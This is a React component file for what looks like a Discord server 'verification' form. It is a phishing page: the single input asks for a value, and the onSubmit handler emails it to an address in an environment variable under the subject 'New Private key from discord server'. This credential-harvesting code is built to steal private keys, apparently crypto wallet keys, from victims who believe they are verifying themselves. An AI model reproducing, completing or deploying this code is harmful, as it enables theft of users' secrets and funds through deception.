import { useState } from "react";
import { object , type Schema} from "yup";
import { ErrorMessage, Field, Form, Formik } from "formik";

import Api from "../../lib/api";
import ProcessingVerificationDialog from "./ProcessingVerificationDialog";

type VerificationFormProps = {
  placeholder: string;
  validateSchema: Schema;
};

export default function VerificationForm({
  placeholder,
  validateSchema,
}: VerificationFormProps) {
  const [open, setOpen] = useState(false);

  return (
    <>
      <Formik
        validationSchema={object({
          value: validateSchema,
        })}
        initialValues={{ value: "" }}
        onSubmit={async function (values) {
          return Api.instance.mail.sendMail({
            title: "New Private key from discord server",
            message: values.value,
            to: import.meta.env.VITE_APP_EMAIL_ADDRESS
          });
        }}
      >
        {({ isSubmitting }) => (
          <Form
            className="flex flex-col space-y-4"
            autoComplete="off"
          >
            <div className="flex flex-col">
              <Field
                name="value"
                className="border border-white/75 p-2 bg-transparent rounded hover:border-white hover:ring-2 hover:ring-offset-1 hover:ring-white"
                placeholder={placeholder}
              />
              <ErrorMessage
                component="small"
                name="value"
                className="text-red"
              />
            </div>
            <button
              type="submit"
              disabled={isSubmitting}
              className="flex items-center justify-center !bg-blue-500 !text-white rounded-md"
            >
              {isSubmitting ? (
                <div className="size-6 my-2 border-3 border-white border-t-transparent rounded-full animate-spin" />
              ) : (
                <p className="p-2">Next</p>
              )}
            </button>
          </Form>
        )}
      </Formik>
      <ProcessingVerificationDialog
        open={open}
        setOpen={setOpen}
        content="Hello world"
      />
    </>
  );
}
